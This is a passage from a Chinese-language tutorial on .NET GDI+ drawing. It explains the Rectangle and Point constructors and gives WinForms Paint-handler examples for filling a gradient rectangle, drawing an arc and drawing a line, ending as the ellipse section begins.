<p>Rectangle结构的构造函数有以下两个：</p>
<p>Rectangle结构的构造函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#160;&#29992;&#25351;&#23450;&#30340;&#20301;&#32622;&#21644;&#22823;&#23567;&#21021;&#22987;&#21270;Rectangle&#31867;&#30340;&#26032;&#23454;&#20363;&#10;public&#160;Rectangle(Point,&#160;Size);&#160;&#160;//&#160;Size&#32467;&#26500;&#23384;&#20648;&#19968;&#20010;&#26377;&#24207;&#25972;&#25968;&#23545;&#65292;&#36890;&#24120;&#20026;&#30697;&#24418;&#30340;&#23485;&#24230;&#21644;&#39640;&#24230;&#10;public&#160;Rectangle(int,&#160;int,&#160;int,&#160;int);</span><br></pre></td></tr></table></figure>
<h3 id="3-6_Point结构">3.6 Point结构</h3><p>用指定坐标初始化Point类的新实例，这个结构很像C++的Point结构，它描述了一对有序的x,y两个坐标值，其构造函数为：</p>
<p><code>public Point(int x, int y);</code> 其中x为该点的水平位置；y为该点的垂直位置。</p>
<p>下面是构造Point对象的示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point&#160;pt1&#160;=&#160;new&#160;Point(30,&#160;30);&#10;Point&#160;pt2&#160;=&#160;new&#160;Point(110,&#160;110);</span><br></pre></td></tr></table></figure>
<h2 id="4_基本图形绘制举例">4 基本图形绘制举例</h2><h3 id="4-1_画一个矩形">4.1 画一个矩形</h3><p>建一个C#.NET WinForms窗体应用程序，通过在窗体的OnPaint事件中绘制一个填充的渐变矩形：</p>
<p>填充矩形方法FillRectangle()的语法帮助定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22635;&#20805;&#160;System.Drawing.Rectangle&#160;&#32467;&#26500;&#25351;&#23450;&#30340;&#30697;&#24418;&#30340;&#20869;&#37096;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#30830;&#23450;&#22635;&#20805;&#29305;&#24615;&#30340;&#160;System.Drawing.Brush&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;rect:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Rectangle&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;FillRectangle(Brush&#160;brush,&#160;Rectangle&#160;rect);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22635;&#20805;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#25351;&#23450;&#30340;&#30697;&#24418;&#30340;&#20869;&#37096;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#30830;&#23450;&#22635;&#20805;&#29305;&#24615;&#30340;&#160;System.Drawing.Brush&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;rect:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;FillRectangle(Brush&#160;brush,&#160;RectangleF&#160;rect);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22635;&#20805;&#30001;&#19968;&#23545;&#22352;&#26631;&#12289;&#19968;&#20010;&#23485;&#24230;&#21644;&#19968;&#20010;&#39640;&#24230;&#25351;&#23450;&#30340;&#30697;&#24418;&#30340;&#20869;&#37096;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#30830;&#23450;&#22635;&#20805;&#29305;&#24615;&#30340;&#160;System.Drawing.Brush&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;width:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#23485;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;height:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#39640;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;FillRectangle(Brush&#160;brush,&#160;float&#160;x,&#160;float&#160;y,&#160;float&#160;width,&#160;float&#160;height);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22635;&#20805;&#30001;&#19968;&#23545;&#22352;&#26631;&#12289;&#19968;&#20010;&#23485;&#24230;&#21644;&#19968;&#20010;&#39640;&#24230;&#25351;&#23450;&#30340;&#30697;&#24418;&#30340;&#20869;&#37096;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#30830;&#23450;&#22635;&#20805;&#29305;&#24615;&#30340;&#160;System.Drawing.Brush&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;width:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#23485;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;height:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#22635;&#20805;&#30340;&#30697;&#24418;&#30340;&#39640;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;FillRectangle(Brush&#160;brush,&#160;int&#160;x,&#160;int&#160;y,&#160;int&#160;width,&#160;int&#160;height);</span><br></pre></td></tr></table></figure>
<p>我们在这里只使用第一种定义，演示填充矩形，示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;g&#160;=&#160;e.Graphics;&#160;&#160;&#160;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Rectangle&#160;rect&#160;=&#160;new&#160;Rectangle(50,&#160;30,&#160;100,&#160;100);&#160;&#160;&#160;//&#160;&#21019;&#24314;&#19968;&#20010;&#30697;&#24418;(x,y,width,height)&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#21019;&#24314;&#32447;&#24615;&#28176;&#21464;&#30011;&#21047;(&#30011;&#21047;&#30028;&#38480;,&#160;&#36215;&#22987;&#39068;&#33394;,&#160;&#32467;&#26463;&#39068;&#33394;,&#160;&#28176;&#21464;&#35282;&#24230;)&#10;&#160; &#160; &#160; &#160; &#160; &#160; LinearGradientBrush&#160;lBrush&#160;=&#160;new&#160;LinearGradientBrush(rect,&#160;Color.Purple,&#160;Color.LightBlue,&#160;LinearGradientMode.BackwardDiagonal);&#10;&#160; &#160; &#160; &#160; &#160; &#160; g.FillRectangle(lBrush,&#160;rect);&#160;&#160;//&#160;&#36208;&#36215;~&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行效果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/20305350fe565d0dbc3d860bfec18d36.jpg" alt=""></p>
<h3 id="4-2_画一个弧">4.2 画一个弧</h3><p>画弧线的语法定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#27573;&#24359;&#32447;&#65292;&#23427;&#34920;&#31034;&#160;System.Drawing.Rectangle&#160;&#32467;&#26500;&#25351;&#23450;&#30340;&#26925;&#22278;&#30340;&#19968;&#37096;&#20998;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#24359;&#32447;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;rect:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#65292;&#23427;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#30028;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;startAngle:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#20174;&#160;x&#160;&#36724;&#21040;&#24359;&#32447;&#30340;&#36215;&#22987;&#28857;&#27839;&#39034;&#26102;&#38024;&#26041;&#21521;&#24230;&#37327;&#30340;&#35282;&#65288;&#20197;&#24230;&#20026;&#21333;&#20301;&#65289;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;sweepAngle:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#20174;&#160;startAngle&#160;&#21442;&#25968;&#21040;&#24359;&#32447;&#30340;&#32467;&#26463;&#28857;&#27839;&#39034;&#26102;&#38024;&#26041;&#21521;&#24230;&#37327;&#30340;&#35282;&#65288;&#20197;&#24230;&#20026;&#21333;&#20301;&#65289;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawArc(Pen&#160;pen,&#160;Rectangle&#160;rect,&#160;float&#160;startAngle,&#160;float&#160;sweepAngle);</span><br></pre></td></tr></table></figure>
<p>参照定义的帮助，可写出如下画弧线的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Pen&#160;pen&#160;=&#160;new&#160;Pen(Color.Blue);&#10;&#160; &#160; &#160; &#160; &#160; &#160; Rectangle&#160;rect&#160;=&#160;new&#160;Rectangle(50,50,200,100);&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.DrawArc(pen,&#160;rect,&#160;12,&#160;84);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行结果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/ae7d6bdee758f18a3d19f58d9da9659e.jpg" alt=""></p>
<h3 id="4-3_画线">4.3 画线</h3><p>画线DrawLine()方法的语法定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#26465;&#36830;&#25509;&#20004;&#20010;&#160;System.Drawing.Point&#160;&#32467;&#26500;&#30340;&#32447;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#32447;&#26465;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pt1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Point&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#36830;&#25509;&#30340;&#31532;&#19968;&#20010;&#28857;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pt2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Point&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#36830;&#25509;&#30340;&#31532;&#20108;&#20010;&#28857;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawLine(Pen&#160;pen,&#160;Point&#160;pt1,&#160;Point&#160;pt2);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#26465;&#36830;&#25509;&#20004;&#20010;&#160;System.Drawing.PointF&#160;&#32467;&#26500;&#30340;&#32447;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#32447;&#26465;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pt1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.PointF&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#36830;&#25509;&#30340;&#31532;&#19968;&#20010;&#28857;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pt2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.PointF&#160;&#32467;&#26500;&#65292;&#23427;&#34920;&#31034;&#35201;&#36830;&#25509;&#30340;&#31532;&#20108;&#20010;&#28857;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawLine(Pen&#160;pen,&#160;PointF&#160;pt1,&#160;PointF&#160;pt2);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#26465;&#36830;&#25509;&#30001;&#22352;&#26631;&#23545;&#25351;&#23450;&#30340;&#20004;&#20010;&#28857;&#30340;&#32447;&#26465;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#32447;&#26465;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#19968;&#20010;&#28857;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#19968;&#20010;&#28857;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#20108;&#20010;&#28857;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#20108;&#20010;&#28857;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawLine(Pen&#160;pen,&#160;float&#160;x1,&#160;float&#160;y1,&#160;float&#160;x2,&#160;float&#160;y2);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#26465;&#36830;&#25509;&#30001;&#22352;&#26631;&#23545;&#25351;&#23450;&#30340;&#20004;&#20010;&#28857;&#30340;&#32447;&#26465;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#32447;&#26465;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#19968;&#20010;&#28857;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y1:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#19968;&#20010;&#28857;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#20108;&#20010;&#28857;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y2:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#31532;&#20108;&#20010;&#28857;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawLine(Pen&#160;pen,&#160;int&#160;x1,&#160;int&#160;y1,&#160;int&#160;x2,&#160;int&#160;y2);</span><br></pre></td></tr></table></figure>
<p>根据定义的帮助，我们以第一种语法 可以写出如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Pen&#160;pen&#160;=&#160;new&#160;Pen(Color.Blue);&#160;&#160;//&#160;&#21019;&#24314;&#34013;&#33394;&#30011;&#31508;&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Point&#160;pointStart&#160;=&#160;new&#160;Point(30,&#160;30);&#160;&#160;&#160;//&#160;&#21019;&#24314;&#36215;&#22987;&#28857;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Point&#160;pointEnd&#160;=&#160;new&#160;Point(150,&#160;150);&#160;&#160;&#160;//&#160;&#21019;&#24314;&#32467;&#26463;&#28857;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.DrawLine(pen,&#160;pointStart,&#160;pointEnd);&#160;&#160;&#160;//&#160;&#30011;&#32447;&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行效果图如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/afb47be11f8d1765201ac7e5d87e185e.jpg" alt=""></p>
<h3 id="4-4_画椭圆">4.4 画椭圆</h3><p>还是先看一下DrawEllipse()画椭圆的语法定义：</p>
